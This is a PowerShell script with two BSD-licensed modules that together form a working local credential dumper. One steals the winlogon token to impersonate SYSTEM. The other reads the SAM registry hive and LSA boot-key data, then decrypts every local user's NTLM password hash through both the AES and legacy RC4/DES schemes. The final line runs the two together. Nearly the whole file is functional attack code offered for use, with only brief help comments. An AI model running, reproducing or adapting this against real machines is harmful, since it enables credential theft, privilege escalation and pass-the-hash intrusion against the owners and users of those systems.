# BSD 3-Clause License
#
# Copyright(c) 2019, Tobias Heilig
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copynotice, this
#    list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copynotice,
#    this list of conditions and the following disclaimer in the documentation
#    and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyholder nor the names of its
#    contributors may be used to endorse or promote products derived from
#    this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYHOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYHOLDER OR CONTRIBUTORS BE LIABLE
# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

#requires -RunAsAdministrator

try {
    & {
        $ErrorActionPreference = 'Stop'
        [void] [impsys.win32]
    }
} catch {
   Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        namespace impsys {
            public class win32 {

                [DllImport("kernel32.dll", SetLastError=true)]
                public static extern bool CloseHandle(
                    IntPtr hHandle);

                [DllImport("kernel32.dll", SetLastError=true)]
                public static extern IntPtr OpenProcess(
                    uint processAccess,
                    bool bInheritHandle,
                    int processId);

                [DllImport("advapi32.dll", SetLastError=true)]
                public static extern bool OpenProcessToken(
                    IntPtr ProcessHandle, 
                    uint DesiredAccess,
                    out IntPtr TokenHandle);

                [DllImport("advapi32.dll", SetLastError=true)]
                public static extern bool DuplicateTokenEx(
                    IntPtr hExistingToken,
                    uint dwDesiredAccess,
                    IntPtr lpTokenAttributes,
                    uint ImpersonationLevel,
                    uint TokenType,
                    out IntPtr phNewToken);

                [DllImport("advapi32.dll", SetLastError=true)]
                public static extern bool ImpersonateLoggedOnUser(
                    IntPtr hToken);

                [DllImport("advapi32.dll", SetLastError=true)]
                public static extern bool RevertToSelf();
            }
        }
"@
}

function Invoke-AsSystem {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [scriptblock]
        $Process,

        [Parameter(Position=1)]
        [object[]]
        $ArgumentList
    )

    $winlogonPid = Get-Process -Name "winlogon" | Select-Object -First 1 -ExpandProperty Id

    if (($processHandle = [impsys.win32]::OpenProcess(
            0x400,
            $true,
            [Int32]$winlogonPid)) -eq [IntPtr]::Zero)
    {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "$([ComponentModel.Win32Exception]$err)"
    }

    $tokenHandle = [IntPtr]::Zero
    if (-not [impsys.win32]::OpenProcessToken(
            $processHandle,
            0x0E,
            [ref]$tokenHandle))
    {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "$([ComponentModel.Win32Exception]$err)"
    }

    $dupTokenHandle = [IntPtr]::Zero
    if (-not [impsys.win32]::DuplicateTokenEx(
            $tokenHandle,
            0x02000000,
            [IntPtr]::Zero,
            0x02,
            0x01,
            [ref]$dupTokenHandle))
    {
        $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Error "$([ComponentModel.Win32Exception]$err)"
    }

    try {
        if (-not [impsys.win32]::ImpersonateLoggedOnUser(
                $dupTokenHandle))
        {
            $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "$([ComponentModel.Win32Exception]$err)"
        }

        & $Process @ArgumentList

    } finally {
        if(-not [impsys.win32]::RevertToSelf())
        {
            $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Error "$([ComponentModel.Win32Exception]$err)"
        }
    }

    <#
        .SYNOPSIS
        Impersonate SYSTEM.

        .DESCRIPTION
        Impersonate Windows built-in SYSTEM account and execute commands on its behalf.

        .PARAMETER Process
        The script block to be executed as SYSTEM.

        .PARAMETER ArgumentList
        Optional list of arguments to the scriptblock.

        .COMPONENT
        Win32

        .NOTES
        Requires to be run as administrator.

        .EXAMPLE
        Invoke-AsSystem { [System.Environment]::UserName }

        .EXAMPLE
        Invoke-AsSystem { param($x,$y) $x + $y } -ArgumentList 1,2
    #>
}

# BSD 3-Clause License
#
# Copy(c) 2019, Tobias Heilig
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copynotice, this
#    list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copynotice,
#    this list of conditions and the following disclaimer in the documentation
#    and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyholder nor the names of its
#    contributors may be used to endorse or promote products derived from
#    this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYHOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYHOLDER OR CONTRIBUTORS BE LIABLE
# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

try{
    & {
        $ErrorActionPreference = 'Stop'
        [void] [ntlmx.win32]
    }
} catch {
    Add-Type -TypeDefinition @"
        using System;
        using System.Text;
        using System.Runtime.InteropServices;
        namespace ntlmx {
            public class win32 {

                [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
                public static extern int RegOpenKeyEx(
                    IntPtr hKey,
                    string subKey,
                    int ulOptions,
                    int samDesired,
                    out IntPtr hkResult);

                [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
                public static extern int RegQueryInfoKey(
                    IntPtr hkey,
                    StringBuilder lpClass,
                    ref int lpcbClass,
                    int lpReserved,
                    out int lpcSubKeys,
                    out int lpcbMaxSubKeyLen,
                    out int lpcbMaxClassLen,
                    out int lpcValues,
                    out int lpcbMaxValueNameLen,
                    out int lpcbMaxValueLen,
                    out int lpcbSecurityDescriptor,
                    IntPtr lpftLastWriteTime);

                [DllImport("advapi32.dll", SetLastError=true)]
                public static extern int RegCloseKey(
                    IntPtr hKey);
            }
        }
"@
}

function Get-NTLMLocalPasswordHashes {
    Get-ChildItem "HKLM:SAM\SAM\Domains\Account\Users" |
    Where-Object {$_.PSChildName -match "^[0-9A-F]{8}$"} |
    ForEach-Object {
        $rid = $_.PSChildName
        $v = (Get-ItemProperty "HKLM:SAM\SAM\Domains\Account\Users\$rid" -Name V).V
        $f = (Get-ItemProperty "HKLM:SAM\SAM\Domains\Account" -Name F).F
        $classes = -join (& {
            "JD", "Skew1", "GBG", "Data" | % {
                $hKey = [IntPtr]::Zero
                if ([ntlmx.win32]::RegOpenKeyEx(
                        0x80000002,
                        "SYSTEM\CurrentControlSet\Control\Lsa\$_",
                        0x0,
                        0x19,
                        [ref]$hKey))
                {
                    $e = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    throw [ComponentModel.Win32Exception]$e
                }
                
                $lpClass = New-Object Text.StringBuilder 1024
                [int]$lpcbClass = 1024
                if ([ntlmx.win32]::RegQueryInfoKey(
                        $hkey,
                        $lpClass,
                        [ref]$lpcbClass,
                        0x0,
                        [ref]$null,
                        [ref]$null,
                        [ref]$null,
                        [ref]$null,
                        [ref]$null,
                        [ref]$null,
                        [ref]$null,
                        [IntPtr]::Zero))
                {
                    $e = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    throw [ComponentModel.Win32Exception]$e
                }

                [void] [ntlmx.win32]::RegCloseKey($hKey)

                $lpClass.ToString()
            }
        })

        $md5 = [Security.Cryptography.MD5]::Create()

        $aes = [Security.Cryptography.Aes]::Create()
        $aes.Mode = [Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [Security.Cryptography.PaddingMode]::None
        $aes.KeySize = 128

        $des = [Security.Cryptography.DES]::Create()
        $des.Mode = [Security.Cryptography.CipherMode]::ECB
        $des.Padding = [Security.Cryptography.PaddingMode]::None

        $offset = [BitConverter]::ToInt32($v, 0x0C) + 0xCC;

        $len = [BitConverter]::ToInt32($v, 0x10);
        $username = [Text.Encoding]::Unicode.GetString($v, $offset, $len);

        $offset = [Bitconverter]::ToInt32($v, 0xA8) + 0xCC

        $bootkey = 8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7 | % {[Convert]::ToByte("$($classes[$_*2])$($classes[$_*2+1])", 16)}

        switch ($v[0xAC]) {
            0x38 {
                $enc_syskey = $f[0x88..0x97]
                $enc_syskey_iv = $f[0x78..0x87]
                $enc_syskey_key = $bootkey

                $syskey = $aes.CreateDecryptor($enc_syskey_key, $enc_syskey_iv).TransformFinalBlock($enc_syskey, 0, 16)

                $enc_ntlm = $v[($offset+24)..($offset+24+0x0F)]
                $enc_ntlm_iv = $v[($offset+8)..($offset+23)]
                $enc_ntlm_key = $syskey

                $enc_ntlm = $aes.CreateDecryptor($enc_ntlm_key, $enc_ntlm_iv).TransformFinalBlock($enc_ntlm, 0, 16)
            }
            
            0x14 {
                $enc_syskey = $f[0x80..0x8f]
                $enc_syskey_key = $md5.ComputeHash(
                    $f[0x70..0x7f] +
                    [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0") +
                    $bootkey +
                    [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0"))
                
                $syskey = rc4 $enc_syskey $enc_syskey_key

                $enc_ntlm = $v[($offset+4)..($offset+4+0x0F)]
                $enc_ntlm_key = $md5.ComputeHash(
                    $syskey +
                    (3,2,1,0 | % {[Convert]::ToByte("$($rid[$_*2])$($rid[$_*2+1])", 16)}) +
                    [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0"))

                $enc_ntlm = rc4 $enc_ntlm $enc_ntlm_key
            }

            default {
                return New-Object PSObject -Property @{
                    Username = $username
                    RID = [int]"0x$rid"
                    NTLM = "31D6CFE0D16AE931B73C59D7E0C089C0"
                }
            }
        }

        $des_str_1 = 3,2,1,0,3,2,1 | % {[Convert]::ToByte("$($rid[$_*2])$($rid[$_*2+1])", 16)}
        $des_str_2 = 0,3,2,1,0,3,2 | % {[Convert]::ToByte("$($rid[$_*2])$($rid[$_*2+1])", 16)}
        $des_key_1 = str_to_key($des_str_1)
        $des_key_2 = str_to_key($des_str_2)

        $ntlm_1 = $des.CreateDecryptor($des_key_1, $des_key_1).TransformFinalBlock($enc_ntlm, 0, 8)
        $ntlm_2 = $des.CreateDecryptor($des_key_2, $des_key_2).TransformFinalBlock($enc_ntlm, 8, 8)

        $ntlm = [BitConverter]::ToString($ntlm_1+$ntlm_2) -split '-' -join ''

        New-Object PSObject -Property @{
            Username = $username
            RID = [int]"0x$rid"
            NTLM = $ntlm
        }
    }

    <#
        .SYNOPSIS
        Extract local NTLM password hashes.

        .DESCRIPTION
        Extract all local NTLM user password hashes from the registry handling latest
        AES-128-CBC with IV obfuscation techniques introduced with Windows 10 1607 as
        well as the traditional MD5/RC4 approach used in Windows 7/8/8.1.

        .OUTPUTS
        System.Management.Automation.PSObject

        .COMPONENT
        Win32

        .NOTES
        Requires to be run as SYSTEM.

        .EXAMPLE
        Get-NTLMLocalPasswordHashes
    #>
}

function rc4($data, $key) {
    $r = $data
    $s = New-Object Byte[] 256
    $k = New-Object Byte[] 256
    for ($i = 0; $i -lt 256; $i++) {
        $s[$i] = [Byte]$i
        $k[$i] = $key[$i % $key.Length]
    }
    $j = 0
    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $s[$i] + $k[$i]) % 256
        $temp = $s[$i]
        $s[$i] = $s[$j]
        $s[$j] = $temp
    }
    $i = $j = 0
    for ($x = 0; $x -lt $r.Length; $x++) {
        $i = ($i + 1) % 256
        $j = ($j + $s[$i]) % 256
        $temp = $s[$i]
        $s[$i] = $s[$j]
        $s[$j] = $temp
        [int]$t = ($s[$i] + $s[$j]) % 256
        $r[$x] = $r[$x] -bxor $s[$t]
    }
	return $r
}

function str_to_key($s) {
    $odd_parity = @(
    1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
    16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
    32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
    49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
    64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
    81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
    97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
    112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
    128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
    145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
    161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
    176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
    193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
    208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
    224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
    241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254)
    $key = @()
    $key += bitshift $s[0] -1
    $key += (bitshift ($s[0] -band 0x01) 6) -bor (bitshift $s[1] -2)
    $key += (bitshift ($s[1] -band 0x03) 5) -bor (bitshift $s[2] -3)
    $key += (bitshift ($s[2] -band 0x07) 4) -bor (bitshift $s[3] -4)
    $key += (bitshift ($s[3] -band 0x0F) 3) -bor (bitshift $s[4] -5)
    $key += (bitshift ($s[4] -band 0x1F) 2) -bor (bitshift $s[5] -6)
    $key += (bitshift ($s[5] -band 0x3F) 1) -bor (bitshift $s[6] -7)
    $key += $s[6] -band 0x7F
    $key[0] = $odd_parity[(bitshift $key[0] 1)]
    $key[1] = $odd_parity[(bitshift $key[1] 1)]
    $key[2] = $odd_parity[(bitshift $key[2] 1)]
    $key[3] = $odd_parity[(bitshift $key[3] 1)]
    $key[4] = $odd_parity[(bitshift $key[4] 1)]
    $key[5] = $odd_parity[(bitshift $key[5] 1)]
    $key[6] = $odd_parity[(bitshift $key[6] 1)]
    $key[7] = $odd_parity[(bitshift $key[7] 1)]
    $key
}

function bitshift($x, $c) {
    return [math]::Floor($x * [math]::Pow(2, $c))
}

Invoke-AsSystem -Process { Get-NTLMLocalPasswordHashes }
